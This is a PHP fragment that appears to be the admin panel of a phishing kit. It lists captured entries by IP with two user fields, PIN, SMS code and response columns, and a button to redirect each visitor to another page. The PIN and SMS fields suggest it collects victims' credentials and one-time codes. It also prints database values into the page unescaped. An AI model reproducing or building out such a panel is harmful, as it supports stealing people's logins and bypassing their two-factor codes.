   <?php
   include 'config.php';

                                           $sql ="SELECT * from user;";
                                           $ret = $db->query($sql);
                                           while($row = $ret->fetchArray(SQLITE3_ASSOC) ) {
                                            $ip = $row['IP'];
                                          ?>
                                         <tr class="tr-shadow">
                                      <td><?php
                                       echo $row['IP'].' / '.$row['type'] ?></td>
                                 
                                            <td><span style="color: red"><?php echo mb_substr($row['user'] , 0 , 40, "utf8" ) ?></span><br>
                                              <span style="color: green"><?php echo mb_substr($row['user2'] , 0 , 40, "utf8" ) ?></span></td>
                                             <td>     <?php if($row['page']!=""){
                 echo '<a style="color:white"  class="btn btn-primary" title="'.$row['page'].'"><i class="nav-icon">'.$row['page'].'</i></a>';

                                   }
                                    else
                                    {
                                    ?>
 <button  onclick="showdata('<?php echo $row['IP'] ?>')" class="btn btn-primary btn-rounded m-1" type="button" data-toggle="modal" data-target=".bd-example-modal-sm" style="margin: 0px !important;">Rediect</button>

                               <?php }?></td>
                                              <td><?php echo $row['reponse'] ?></td>
                                            <td><?php echo $row['pin'] ?></td>

                                            <td><?php echo mb_substr($row['sms'] , 0 , 20, "utf8" ) ?></td>
                                         
                      
                                                    <td>
                                                    <a  class="btn btn-success" href="alyss.php?ip=<?php echo mb_substr($row['IP'] , 0 , 20, "utf8" ) ?>"><i class="nav-icon i-Pen-2"></i></a>
                                                      <a class="btn btn-danger"  href="delete.php?ip=<?php echo $row['IP']."&dirpt=".$row['sessionuser']?>"><i class="nav-icon i-Close-Window"></i></a>
                                                      
                                            </td>
                                                
                                            </tr>
                                                 <?php


                                             }
                                             $db->close();


                                            ?>